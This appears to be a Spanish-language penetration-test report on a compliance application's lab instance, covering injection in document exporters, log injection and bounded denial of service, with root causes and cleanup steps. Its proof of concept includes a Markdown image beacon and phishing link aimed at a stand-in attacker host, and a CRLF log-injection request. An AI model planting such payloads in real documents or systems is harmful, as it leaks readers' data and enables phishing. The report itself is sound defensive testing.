# RT-03, RT-07, RT-12 — Inyección en exportadores, log injection y DoS acotado

Cobertura de tres objetivos de la letra (sección 7.2) que quedaban pendientes. Cada uno se
abordó primero por código y luego, cuando correspondía, con una prueba acotada contra la
instancia de laboratorio. Todos los datos de prueba fueron eliminados al finalizar.

---

## RT-03 — Inyecciones en módulos y exportadores

**Objetivo de la letra:** *"Inyecciones (SQL, XML, template SSTI) en módulos y exportadores
(posible RCE vía plantillas)."*

### SQL injection — descartado

Búsqueda de `$queryRaw`/`$executeRaw` (los únicos puntos donde Prisma permite SQL no
parametrizado) en todo `backend/src`: **0 resultados**. Todo el acceso a datos pasa por el
ORM de Prisma con consultas parametrizadas. No hay superficie de SQLi.

### SSTI / RCE vía plantillas — descartado

Los exportadores (`exportaciones.service.ts`, `urcdp.service.ts`, `soa.service.ts`,
`mcu.service.ts`, `bcu.service.ts`, `cobit.service.ts`) **no usan ningún motor de templates**
(sin Jinja/Handlebars/EJS/Pug/Nunjucks/Mustache) ni `eval`/`new Function`/`child_process`. El
Markdown se arma con *template literals* de TypeScript (compilados en build time, no
interpretan texto del usuario como código) interpolando valores escapados con una función
`celda()`/`texto()` repetida en cada módulo. No hay forma de que un dato de usuario se evalúe
como plantilla — descarta RCE por esta vía.

### Markdown injection en exportadores — **CONFIRMADO (medio)**

La función de escape (`celda()` en `exportaciones.service.ts`, `texto()` en
`urcdp.service.ts`, equivalentes en el resto) solo escapa `&`, `<`, `>`, `|` y normaliza
saltos de línea — pensada para no romper **tablas Markdown**. No escapa `[`, `]`, `(`, `)`,
por lo que la sintaxis de **links e imágenes Markdown** (`[texto](url)`, `![alt](url)`) pasa
íntegra a los documentos exportados.

**PoC ejecutado:**
1. Se creó una política con `descripcion`:
   `Texto normal. ![x](https://atacante.example/track.png?leak=SECRETO) y un [link engañoso](https://atacante.example/phish) en medio del texto.`
2. Se exportó `GET /exportaciones/organizaciones/:id/politica-seguridad`.
3. El documento resultante contiene el payload **sin escapar**, tal cual se envió.

**Impacto:** estos documentos son reportes de cumplimiento (política de seguridad, SoA,
inventario de activos) pensados para auditores/Dirección. Si se abren con un visor que
auto-carga imágenes remotas (VS Code preview, Obsidian, algunos visores web de Markdown),
`![x](url-del-atacante)` actúa como **beacon de exfiltración pasiva** (confirma cuándo y
quién abrió el documento, filtra IP/metadata del lector). El link disfrazado habilita
**phishing** dentro de un documento que se presenta como oficial. No se demostró ejecución de
código ni acceso a datos más allá del propio beacon.

**Causa raíz:** falta escapar `[`, `]`, `(`, `)` (o, más robusto, usar una librería de
sanitización Markdown) en la función de escape compartida por los exportadores.

**Limpieza:** la política de prueba fue eliminada tras la verificación.

## RT-07 — Envenenamiento de logs (log injection)

**Objetivo de la letra:** *"Envenenamiento de logs (log injection) para eludir auditoría."*

**Resultado: no explotable con la arquitectura actual.**

- El backend **no tiene ningún sink de logging de aplicación**: no usa `console.log`,
  `Logger` de Nest, `morgan`, `winston` ni `pino` en ningún punto de `backend/src`. Los campos
  de texto libre del usuario (nombre de riesgo, descripción de incidente, etc.) nunca llegan
  a un archivo/stream de logs de aplicación — solo quedan en la base de datos y en la tabla
  `AuditEvent` (vía Prisma, sin concatenación de strings vulnerable a inyección de formato).
- El único log que recibe texto controlado por el cliente es el **access log de nginx**
  (formato `combined` por defecto), que registra la línea de request completa. Se probó
  CRLF injection clásico en un parámetro de query:
  `GET /seguridad/riesgos?estado=FORJADO%0d%0a<línea de log falsa>` → el log de nginx
  registró la línea **completa, en una sola entrada, con el `%0d%0a` literal sin decodificar**
  (confirmado con `cat -A` sobre el log crudo del contenedor). nginx no decodifica
  percent-encoding antes de loguear `$request`, así que no permite forjar líneas nuevas.
- Los campos de texto libre (`nombre`, `descripcion`) viajan en el **body** JSON de los
  `POST`/`PATCH`, no en la URL, así que ni siquiera llegan al access log de nginx.

**Conclusión:** la combinación de "sin logging de aplicación" + "nginx no decodifica antes de
loguear" cierra el vector de log injection para esta aplicación tal como está desplegada.

## RT-12 — Denegación de servicio acotada en el exportador

**Objetivo de la letra:** *"Denegación de servicio acotado en el exportador (generación
pesada)."* Se interpretó "acotado" como: demostrar el vector sin degradar el laboratorio
compartido ni intentar una caída real del servicio.

### Hallazgo de código

Ningún exportador (`exportaciones`, `urcdp`, `soa`, `mcu`, `bcu`, `cobit`) usa `take`/`skip`
en sus consultas Prisma: todos traen **la tabla completa** relevante con `findMany()` sin
límite y arman el documento completo en memoria en una sola respuesta.

### Prueba acotada (datos sintéticos, 150 registros)

1. **Línea base:** export de `inventario-activos` con los 5 activos del seed — **~0.08 s**
   (en caliente).
2. Se crearon **150 activos sintéticos** en una unidad temporal (≈15 s de alta, vía API, sin
   concurrencia).
3. Export con 155 activos (31× el volumen original) — **~0.13 s**, documento de 27.8 KB. A
   esta escala no hay explosión cuadrática.
4. **Concurrencia acotada:** 10 requests simultáneas al mismo export (sin sostenerlas en el
   tiempo) → cada request pasó de ~0.1 s a **~0.9–1.1 s** (≈10× más lenta), aunque las 10
   terminaron en ~1.2 s de reloj. Confirma contención real de recursos (pool de conexiones
   DB / cómputo single-thread de Node) ante un volumen moderado de pedidos concurrentes al
   mismo endpoint sin paginar.

**Conclusión:** existe un vector estructural real (sin paginación + sin límite de
concurrencia específico por endpoint pesado — el `limit_req` de nginx es general, `20r/s`
para toda la API, no está pensado para proteger a los exportadores en particular). Con el
volumen de datos de un despliegue real (miles de activos/riesgos) y unas pocas decenas de
requests concurrentes, el amplificador observado (≈10× con solo 10 requests) sugiere que el
endpoint de exportación podría degradar la disponibilidad del resto de la API. **No se
intentó una prueba de carga mayor** para no arriesgar la estabilidad del laboratorio
compartido; esta es una extrapolación razonada a partir de la tendencia medida, no una
demostración de caída real del servicio.

**Causa raíz:** falta de paginación/límite de tamaño en los exportadores y ausencia de un
`limit_req` específico (más estricto) para los endpoints de `/exportaciones/*` y
`/datos/*/exportar`.

**Limpieza:** los 150 activos sintéticos y la unidad temporal fueron eliminados; el inventario
volvió a 5 activos (estado original).
